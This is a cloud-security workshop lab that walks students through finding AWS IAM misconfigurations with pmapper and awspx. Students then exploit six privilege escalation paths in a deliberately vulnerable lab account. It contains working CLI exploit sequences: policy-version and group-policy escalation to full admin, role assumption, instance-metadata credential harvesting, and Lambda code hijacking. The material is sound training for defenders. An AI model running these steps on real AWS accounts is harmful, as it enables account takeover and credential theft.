# Lab 1 - Layin' Down the Law: Identifying and Exploiting IAM Misconfigurations

**Duration:** 45 minutes

## Overview

In this lab, you'll use open source tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.

**What You'll Learn:**
- IAM privilege escalation strategies and what makes them possible
- How attackers use tools like **pmapper** to automatically discover IAM vulnerabilities
- How to visualize IAM relationships using **awspx**
- How to exploit six distinct privilege escalation paths—each with a **different root cause**

---

## Environment Set Up

TODO - add instructions for allocating AWS account, configuring credentials in web shell, cloning git repo, and running set up script.
---

## Privilege Escalation Categories

Throughout this workshop, we will reference [pathfinding.cloud](https://pathfinding.cloud), an open source knowledge store dedicated to understanding, detecting & demonstrating AWS IAM Privilege Escalation. We'll start by exploring the Privilege Escalation Library and understanding the categories used to 

1. Navigate to [pathfinding.cloud](https://pathfinding.cloud) in your browser.

1. Open the **Privilege Escalation Library**.

1. Note the drop-down menu to filter by **CATEGORY**. As of writing these instructions, pathfinding.cloud organizes privilege escalation paths into five categories.

| Category              | Description                                 |
|-----------------------|---------------------------------------------|
| **Self-Escalation**   | Modify your own permissions directly to escalate privileges
| **Principal Access**  | Gain access to a different principal to escalate privileges       |
| **New PassRole**      | Create a new resource (EC2, Lambda, etc.) and pass a privileged role to it |
| **Existing PassRole** | Modify an existing resource with an attached role and gain access to that role     |
| **Credential Access** | Access to hardcoded credentials stored insecurely        |

In this lab, you'll exploit vulnerabilities from several of these categories.

Take a moment to explore the different categories in pathfinding.cloud. You can click on each path to see a description and attack visualization. 

---

## Exercise 1: Building Your IAM Intelligence

Now that you are familiar with general privilege escalation techniques, it's time to find find out what IAM vulnerabilities exist in your lab AWS account. You will approach this the same way many bad actors do, with open source cloud pentesting tools. You will use the following two tools to do reconnaissance on the lab AWS account and find the juciest IAM vulnerabilities to exploit.

- **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
- **awspx**: Visualizes IAM relationships as an interactive graph

> [!NOTE]
> In addition to the tools you will use in this lab, there are several well known AWS pentesting tools useful for IAM privilege escalation. The **OSS DETECTION** field on pathfinding.cloud shows you which existing open source tools can detect a given attack path.

### Understanding the Tools

| Tool | Purpose | 
|------|---------|
| pmapper | Script and library for identifying risks in the configuration of AWS Identity and Access Management (IAM) |
| awspx | Graph-based tool for visualizing effective access and resource relationships within AWS |

### Part A: Create the pmapper Graph

pmapper works by first building a "graph" of your AWS account's IAM configuration. This graph captures all users, roles, groups, and their permissions.

> [!NOTE]
> **What permissions does pmapper need?** pmapper makes read-only AWS API calls to build its graph — `iam:List*` and `iam:Get*` actions across users, roles, groups, and policies. It also calls `sts:GetCallerIdentity` and checks for Organizations SCPs. The AWS managed policy **ReadOnlyAccess** is sufficient. pmapper never modifies your account — it only reads configuration data to build a local graph model.
>
> While Pmapper is primarily 

1. **Create the IAM graph:**
   ```bash
   pmapper graph create --include-regions us-east-1 us-east-2 us-west-1 us-west-2
   ```

   Example output (partial):

   ```
    2026-02-06 18:45:12-0700 | Sorting users, roles, groups, policies, and their relationships.
    2026-02-06 18:45:12-0700 | Obtaining Access Keys data for IAM users
    2026-02-06 18:45:13-0700 | Gathering MFA virtual device information
    2026-02-06 18:45:13-0700 | Gathering MFA physical device information
    2026-02-06 18:45:13-0700 | Determining which principals have administrative privileges
    2026-02-06 18:45:13-0700 | Initiating edge checks.
    2026-02-06 18:45:13-0700 | Generating Edges based on EC2 Auto Scaling.
    ```

   This command:
   - Enumerates all IAM users, roles, and groups
   - Retrieves all attached and inline policies
   - Analyzes trust relationships between principals
   - Takes 1-2 minutes to complete

   `pmapper graph create` saves a serialized graph data store to a platform-specific directory such as `~/.local/share/principalmapper` on Linux
   
   When it finishes running you will see a summary similar to the following:

    ```
    Graph Data for Account:  <account ID>
    # of Nodes:              45 (11 admins)
    # of Edges:              38
    # of Groups:             2
    # of (tracked) Policies: 52
    ```

    You can redisplay this graph summary any time with 

    ```
    pmapper graph display
    ```

   In the example above `11 admins` tells you how many principals have administrative access—these are high-value targets for attackers.

### Part B: Run Privilege Escalation Analysis

Now use pmapper to automatically find privilege escalation paths:

```bash
pmapper analysis --output-type text
```

**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore. The following are a few examples of what you will see in the pmapper output.

```
* user/iamws-ci-runner-user can escalate privileges by accessing the
  administrative principal role/iamws-prod-deploy-role:
   * user/iamws-ci-runner-user can use EC2 to run an instance with an
     existing instance profile to access role/iamws-prod-deploy-role

* user/iamws-role-assumer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-admin-role:
   * user/iamws-role-assumer-user can access via sts:AssumeRole
     role/iamws-privileged-admin-role

* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function to access role/iamws-privileged-lambda-role
```

**Key insight:** pmapper automatically identified that low-privilege users can reach administrative principals. An attacker with access to any of these users could compromise the entire account.

### Part C: Load Data into awspx

awspx provides a visual way to explore IAM relationships. Where pmapper gives you text-based output, awspx renders an **interactive graph** so you can visually trace how users, roles, groups, and policies connect—and where attack paths exist. It's already running at [http://localhost](http://localhost).

1. **Ingest AWS IAM data:**
   ```bash
   awspx ingest --env --services IAM --region us-east-1
   ```

   Similar to pmapper, this command pulls IAM data into awspx's graph database (Neo4j).

2. **Open awspx** in your browser at [http://localhost](http://localhost)

   You'll see an empty canvas with a **search bar** at the bottom and a **toolbar** on the right side.

3. **Add a resource to the graph:** Click the search bar and type `iamws-group-admin-user`. Select it from the dropdown. A single **user node** (red person icon) appears on the canvas.

   > [!TIP]
   > The search bar acts as a resource picker. Type any part of a resource name and awspx shows matching users, roles, groups, and policies from the ingested data. Selecting a resource adds it as a node on the graph.

4. **Find the attack path using Advanced Search:**

   Now let's ask awspx: *"Can this user reach admin?"*

   a. Click the **filter icon** (⚙) to the right of the search bar to open **Advanced Search**.

   b. In the **From** field, type `iamws-group-admin-user` and select it from the dropdown.

   c. In the **To** field, type `Effective Admin` and select it. "Effective Admin" is a special awspx node that represents full administrative access (`Action: *, Resource: *`).

   d. Notice the generated query at the bottom of the panel:
      ```
      MATCH Paths=ShortestPath((Source)-[:TRANSITIVE|ATTACK*0..]->(Target))
      WHERE ID(Source) IN [...]
      AND ID(Target) IN [...]
      RETURN Paths LIMIT 500
      ```
      This is a [Cypher](https://neo4j.com/docs/cypher-manual/current/introduction/) query that finds the shortest path between the two resources, following transitive permissions and attack edges.

   e. Click the **Run** button (▶) in the bottom-right corner.

5. **Interpret the result:**

   The graph now shows two nodes connected by a **dashed arrow**:

   - **`iamws-group-admin-user`** (red person icon) — the attacker
   - **`Effective Admin`** (crown icon) — full admin access
   - A **dashed line labeled `PutGroupPolicy`** connecting them — the attack path

   **What this tells you:** awspx discovered that `iamws-group-admin-user` can reach administrative access through the `PutGroupPolicy` action. The dashed line represents an *attack edge*—meaning this isn't a direct permission, but an exploitable path that an attacker could follow to escalate privileges.

   > [!NOTE]
   > You'll exploit this exact path later in Exercise 7. For now, the key takeaway is that awspx can visually map out privilege escalation paths that would be difficult to spot by reading JSON policies alone.

6. **Explore on your own:** Click the **back arrow** (←) at the bottom-left to return to the search bar. Try running the same Advanced Search for other `iamws-` users (like `iamws-ci-runner-user` or `iamws-role-assumer-user`) to see their paths to `Effective Admin`. Each user reaches admin through a *different* attack path—this is the variety of vulnerabilities you'll exploit in the upcoming exercises.

You now have two powerful tools ready to explore IAM vulnerabilities. pmapper gives you scriptable text output for querying specific permissions, while awspx gives you a visual graph for discovering and understanding attack paths.

---

## Exercise 2: CreatePolicyVersion - Self-Escalation

**Category:** Self-Escalation
**Attacker:** `iamws-policy-developer-user`

**The Vulnerability:** The `iamws-policy-developer-user` can create new versions of IAM policies—including a policy that's attached to themselves. By creating a new version with administrator permissions and setting it as default, they escalate their own privileges.

**Real-world scenario:** A developer is given permission to manage "development" policies for their team. Without proper constraints, they can modify ANY policy—including ones attached to their own user, effectively granting themselves any permission they want.

### Part A: Identify with pmapper

First, confirm this user has the dangerous permission:

```bash
pmapper query "can user/iamws-policy-developer-user do iam:CreatePolicyVersion with *"
```

Expected output:
```
user/iamws-policy-developer-user IS authorized to call action
iam:CreatePolicyVersion for resource *
```

**What this means:** The user can create new versions of ANY policy. The `*` wildcard is part of the problem—but even restricting the Resource wouldn't fully fix it if they can still modify policies attached to themselves.

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-001](https://pathfinding.cloud/paths/iam-001) to understand this attack path:

- **Category:** Self-Escalation
- **Required Permission:** `iam:CreatePolicyVersion` (or `iam:SetDefaultPolicyVersion`)
- **Attack:** Create a new policy version with admin permissions, set as default
- **Impact:** Immediate full account access

Self-escalation attacks are the simplest privilege escalation—the attacker doesn't need to compromise another principal, they just modify their own permissions.

### Part C: Exploit the Vulnerability

Now let's prove this vulnerability is exploitable.

**Step 1: Get credentials for the vulnerable principal**
```bash
# Store the account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Assume the vulnerable role
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-policy-developer-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

# Set the credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your attacker identity**
```bash
aws sts get-caller-identity
```

You should see you're now operating as the `iamws-policy-developer-role`.

**Step 3: Identify the policy attached to this user**
```bash
# The developer-tools-policy is attached to this user
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

# View the current policy
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Note the limited permissions (S3, EC2 read-only).

**Step 4: Create a new policy version with admin permissions**
```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default
```

**Step 5: Verify the escalation**
```bash
# Now test an admin action - list all IAM users
aws iam list-users --query 'Users[].UserName' --output table
```

**You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself.

### Cleanup

Reset your credentials before continuing:
```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Verify you're back to your original identity
aws sts get-caller-identity
```

**Instructor will reset the policy version.**

### What You Learned

- **iam:CreatePolicyVersion** allows modifying any policy, including ones attached to self
- The root cause is the ability to modify a policy that grants YOUR OWN permissions
- Even with resource constraints, if you can modify your own attached policy, you can escalate
- **Remediation preview:** In Lab 2, you'll apply a **Permissions Boundary** to cap maximum permissions

---

## Exercise 3: AssumeRole - Principal Access via Permissive Trust

**Category:** Principal Access
**Attacker:** `iamws-role-assumer-user`
**Target:** `iamws-privileged-admin-role`

**The Vulnerability:** The `iamws-privileged-admin-role` has an overly permissive trust policy—it trusts the entire AWS account (`:root`). Any principal in the account with `sts:AssumeRole` permission can assume this admin role.

**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking "this restricts it to our account." But account root trust means ANY principal in the account with AssumeRole permission can become this role.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-role-assumer-user do sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role"
```

Expected output:
```
user/iamws-role-assumer-user IS authorized to call action
sts:AssumeRole for resource arn:aws:iam::*:role/iamws-privileged-admin-role
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud STS-001](https://pathfinding.cloud/paths/sts-001) to understand this attack path:

- **Category:** Principal Access
- **Required Permission:** `sts:AssumeRole` + permissive trust policy on target
- **Root Cause:** Trust policy trusts account root instead of specific principals
- **Impact:** Access to any role with permissive trust

**Key insight:** The vulnerability is NOT in the attacker's `sts:AssumeRole` permission—it's in the TARGET role's trust policy. The trust policy is a **resource policy** that controls who can assume the role.

### Part C: Examine the Trust Policy

First, look at the vulnerable trust policy:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

You'll see:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" },
    "Action": "sts:AssumeRole"
  }]
}
```

**The problem:** `:root` means "any principal in this account"—not "the root user."

### Part D: Exploit the Vulnerability

**Step 1: Assume the low-privilege role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-role-assumer-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your low-privilege identity**
```bash
aws sts get-caller-identity
```

**Step 3: Assume the privileged admin role**
```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

**Step 4: Verify escalation**
```bash
aws sts get-caller-identity
```

You should see `iamws-privileged-admin-role` in the ARN. You now have `AdministratorAccess`.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- Trust policies using `:root` trust the entire account, not just the root user
- The vulnerability is in the **resource policy** (trust policy), not the identity policy
- **Remediation preview:** In Lab 2, you'll **harden the trust policy** to trust only specific principals

---

## Exercise 4: PassRole + EC2 - New PassRole

**Category:** New PassRole
**Attacker:** `iamws-ci-runner-user`
**Target:** `iamws-prod-deploy-role` (via EC2 instance)

**The Vulnerability:** The `iamws-ci-runner-user` can pass any role to an EC2 instance because the PassRole permission is missing the `iam:PassedToService` condition key. By launching an instance with a privileged instance profile, they can harvest the role's credentials from the instance metadata service.

**Real-world scenario:** A CI/CD pipeline user needs to launch EC2 instances for build jobs. Without the `iam:PassedToService` condition, they can pass ANY role to EC2—including production admin roles.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-ci-runner-user do iam:PassRole with *"
```

Expected output:
```
user/iamws-ci-runner-user IS authorized to call action iam:PassRole for resource *
```

Also check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-ci-runner-user"
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud EC2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required Permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root Cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect—the attacker doesn't directly become the role, they pass it to a compute service that exposes the credentials.

### Part C: Examine the Vulnerable Policy

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-policy-version \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Notice the PassRole statement has `Resource: "*"` but **no Condition block**. The missing condition is:
```json
"Condition": {
  "StringEquals": {
    "iam:PassedToService": "ec2.amazonaws.com"
  }
}
```

### Part D: Understand the Attack Flow

We won't actually launch an EC2 instance (to avoid costs), but here's how the attack works:

**Step 1: Assume the CI runner role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Find privileged instance profiles**
```bash
aws iam list-instance-profiles \
  --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' \
  --output table
```

You'll see `iamws-prod-deploy-profile` with role `iamws-prod-deploy-role` (which has `*:*` permissions).

**Step 3 (Conceptual): Launch EC2 with privileged profile**
```bash
# DO NOT RUN - for illustration only
aws ec2 run-instances \
  --image-id ami-xxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --key-name my-key
```

**Step 4 (Conceptual): Harvest credentials from instance**
```bash
# From inside the EC2 instance:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/iamws-prod-deploy-role
```

The metadata service returns temporary credentials for the attached role.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **iam:PassRole** controls which roles can be attached to compute services
- The missing `iam:PassedToService` condition is the root cause (not just `Resource: "*"`)
- Unrestricted PassRole + compute permissions = credential access to any role with an instance profile
- **Remediation preview:** In Lab 2, you'll add the **iam:PassedToService condition key**

---

## Exercise 5: UpdateFunctionCode - Existing PassRole

**Category:** Existing PassRole
**Attacker:** `iamws-lambda-developer-user`
**Target:** `iamws-privileged-lambda` (with `iamws-privileged-lambda-role`)

**The Vulnerability:** The `iamws-lambda-developer-user` can update the code of ANY Lambda function—including functions that have privileged execution roles. By replacing the code with a malicious payload, they can exfiltrate the Lambda's credentials.

**Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own), they can target Lambdas with privileged roles.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-lambda-developer-user do lambda:UpdateFunctionCode with *"
```

Check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-lambda-developer-user"
```

Expected output:
```
* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function (arn:aws:lambda:...:function:iamws-privileged-lambda)

* user/iamws-group-admin-user can escalate privileges by using
  iam:PutGroupPolicy to add an administrative inline policy to a
  group they belong to
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud Lambda-003](https://pathfinding.cloud/paths/lambda-003):

- **Category:** Existing PassRole
- **Required Permission:** `lambda:UpdateFunctionCode` (unrestricted)
- **Root Cause:** Can modify ANY Lambda, not just designated ones
- **Impact:** Access to any Lambda's execution role

Unlike "New PassRole" where you CREATE new compute, "Existing PassRole" exploits EXISTING compute that already has a role attached.

### Part C: Exploit the Vulnerability

**Step 1: Assume the Lambda developer role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-lambda-developer-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Find the privileged Lambda**
```bash
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table
```

You'll see `iamws-privileged-lambda` with role `iamws-privileged-lambda-role` (which has `AdministratorAccess`).

**Step 3: View the target function's role**
```bash
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text
```

**Step 4 (Conceptual): Update with malicious code**

The attack would replace the Lambda code with:
```python
import boto3
import os

def handler(event, context):
    # Exfiltrate the credentials
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()

    # The Lambda has AdministratorAccess!
    # Attacker could: create new IAM user, exfiltrate data, etc.
    return identity
```

Then invoke the function to get the credentials.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **lambda:UpdateFunctionCode** with `Resource: "*"` allows hijacking any Lambda
- The root cause is the lack of **resource constraint** (should restrict to specific Lambda ARNs)
- Existing PassRole attacks target compute that ALREADY has privileged roles
- **Remediation preview:** In Lab 2, you'll add a **resource constraint** to limit which Lambdas can be modified

---

## Exercise 6: GetFunctionConfiguration - Credential Access

**Category:** Credential Access
**Attacker:** `iamws-secrets-reader-user`
**Target:** Secrets in `iamws-app-with-secrets` Lambda environment variables

**The Vulnerability:** The `iamws-secrets-reader-user` can read Lambda function configurations, which include environment variables. A Lambda function has secrets (database password, API keys) stored in plaintext environment variables—visible to anyone who can call `GetFunctionConfiguration`.

**Real-world scenario:** A monitoring or debugging tool needs read access to Lambda configurations. Environment variables are a common (but insecure) place to store secrets. Anyone with this read permission can see all secrets.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-secrets-reader-user do lambda:GetFunctionConfiguration with *"
```

Expected output:
```
user/iamws-secrets-reader-user IS authorized to call action
lambda:GetFunctionConfiguration for resource *
```

### Part B: Understand the Attack Category

- **Category:** Credential Access
- **Required Permission:** `lambda:GetFunctionConfiguration`
- **Root Cause:** Secrets stored in plaintext Lambda environment variables
- **Impact:** Access to credentials for external systems (databases, APIs, etc.)

This category is different—you're not escalating IAM permissions, you're accessing credentials that grant access outside AWS.

### Part C: Exploit the Vulnerability

**Step 1: Assume the secrets reader role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-secrets-reader-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Find Lambdas with environment variables**
```bash
aws lambda list-functions \
  --query 'Functions[?Environment.Variables].FunctionName' \
  --output table
```

**Step 3: Read the secrets**
```bash
aws lambda get-function-configuration \
  --function-name iamws-app-with-secrets \
  --query 'Environment.Variables' \
  --output json
```

**Expected output (SECRETS EXPOSED!):**
```json
{
    "DB_HOST": "prod-db.example.internal",
    "DB_USERNAME": "app_service_account",
    "DB_PASSWORD": "SuperSecretPassword123!",
    "API_KEY": "sk-prod-api-key-do-not-expose",
    "ADMIN_CREDENTIALS": "admin:P@ssw0rd!"
}
```

**You just read production database credentials, API keys, and admin passwords.**

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- Lambda environment variables are **visible to anyone** with `GetFunctionConfiguration`
- This is NOT an IAM privilege escalation—it's credential theft
- Secrets in env vars is a **best practice violation**, not a policy misconfiguration
- **Remediation preview:** In Lab 2, you'll learn to use **AWS Secrets Manager** instead

---

## Exercise 7: PutGroupPolicy - Self-Escalation via Groups

**Category:** Self-Escalation
**Attacker:** `iamws-group-admin-user`

**The Vulnerability:** The `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, they can write an admin policy on that group—immediately granting themselves full access.

**Real-world scenario:** A team lead is given permission to manage group policies for their team. Without a resource constraint limiting WHICH groups they can modify, they can escalate by writing an admin inline policy on their own group.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-group-admin-user do iam:PutGroupPolicy with *"
```

Expected output:
```
user/iamws-group-admin-user IS authorized to call action
iam:PutGroupPolicy for resource *
```

**What this means:** The user can write inline policies on ANY group—including groups they belong to. Since inline policies on a group apply to all members, this is a direct self-escalation path.

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-011](https://pathfinding.cloud/paths/iam-011) to understand this attack path:

- **Category:** Self-Escalation
- **Required Permission:** `iam:PutGroupPolicy` (unrestricted)
- **Attack:** Write an inline policy with admin permissions on a group the attacker belongs to
- **Impact:** Immediate full account access for the attacker (and all other group members)

This is different from Exercise 2's self-escalation (CreatePolicyVersion)—here the attacker escalates through a **group** rather than modifying a managed policy directly. Inline policies on groups are often overlooked in security reviews.

### Part C: Exploit the Vulnerability

**Step 1: Get credentials for the vulnerable principal**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-group-admin-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your attacker identity**
```bash
aws sts get-caller-identity
```

You should see you're now operating as `iamws-group-admin-role`.

**Step 3: Enumerate groups and find your membership**
```bash
# List all groups
aws iam list-groups --query 'Groups[].GroupName' --output table

# Check which groups the attacker belongs to
aws iam list-groups-for-user --user-name iamws-group-admin-user \
  --query 'Groups[].GroupName' --output table
```

You'll see the user is a member of `iamws-dev-team`.

**Step 4: View the current benign inline policy**
```bash
# List inline policies on the group
aws iam list-group-policies --group-name iamws-dev-team

# Read the current policy (read-only permissions)
aws iam get-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-readonly \
  --query 'PolicyDocument' --output json
```

Note the limited permissions (S3/EC2 read-only).

**Step 5: Write an admin inline policy on the group**
```bash
aws iam put-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-escalated \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'
```

**Step 6: Verify the escalation**
```bash
# Now test an admin action - list all IAM users
aws iam list-users --query 'Users[].UserName' --output table
```

**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. Every member of `iamws-dev-team` is now also an admin.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Verify you're back to your original identity
aws sts get-caller-identity
```

**Instructor will remove the escalated inline policy.**

### What You Learned

- **iam:PutGroupPolicy** with `Resource: "*"` allows writing inline policies on any group
- Inline policies on a group immediately apply to **all group members**
- The root cause is the wildcard resource—the user should only be able to manage specific groups
- This is a second form of self-escalation: through **group membership** rather than direct policy modification
- **Remediation preview:** In Lab 2, you'll restrict `PutGroupPolicy` with a **resource constraint** limiting which group ARNs can be modified

---

## Wrap-up

### What You Accomplished

In this lab, you:
1. Built an IAM graph using pmapper and identified privilege escalation paths
2. Explored IAM relationships visually with awspx
3. Exploited **six distinct privilege escalation vulnerabilities**, each with a **different root cause**:

| Exercise | Attack | Category | Root Cause |
|----------|--------|----------|------------|
| 2 | CreatePolicyVersion | Self-Escalation | Can modify policy attached to self |
| 3 | AssumeRole | Principal Access | Trust policy trusts account root |
| 4 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
| 5 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
| 6 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars |
| 7 | PutGroupPolicy | Self-Escalation | Can write inline policies on own group (no resource constraint) |

### Why Different Root Causes Matter

If all vulnerabilities had the same root cause (like `Resource: "*"`), you'd think:
> "Just avoid wildcard resources and I'm safe."

But each vulnerability requires a **different defense**:

| Root Cause | Defense |
|------------|---------|
| Can modify own attached policy | **Permissions Boundary** |
| Trust policy too permissive | **Harden Trust Policy** |
| PassRole missing condition | **Condition Key** (`iam:PassedToService`) |
| Can modify any resource | **Resource Constraint** |
| Secrets in plaintext | **Use Secrets Manager** |
| PutGroupPolicy on any group | **Resource Constraint** (restrict to specific group ARNs) |

### Mapping to Lab 2 Remediations

| Vulnerability | Lab 2 Guardrail | Defense Type |
|---------------|-----------------|--------------|
| CreatePolicyVersion | Permissions Boundary | Permissions Boundary |
| AssumeRole (permissive trust) | Harden Trust Policy | Resource Policy |
| PassRole + EC2 | Add Condition Key | Condition Key |
| UpdateFunctionCode | Resource Constraint | Identity Policy Fix |
| GetFunctionConfiguration | Use Secrets Manager | Best Practice |
| PutGroupPolicy | Restrict Resource ARN | Resource Constraint |

---

## Next Steps

Continue to **[Lab 2 - Fencin' the Frontier](../lab-2-fencin-the-frontier/lab-2-instructions.md)** where you'll apply guardrails to prevent the attacks you just executed.

---

## Optional: Additional pmapper Queries

Explore more of pmapper's query capabilities:

```bash
# Who can become admin?
pmapper query "who can do iam:* with *"

# Can a specific user reach admin?
pmapper query "can user/iamws-ci-runner-user do s3:* with *"

# Who can pass a specific role?
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role"

# List all privesc paths
pmapper analysis --output-type text

# Visualize the graph (requires graphviz)
pmapper visualize
```
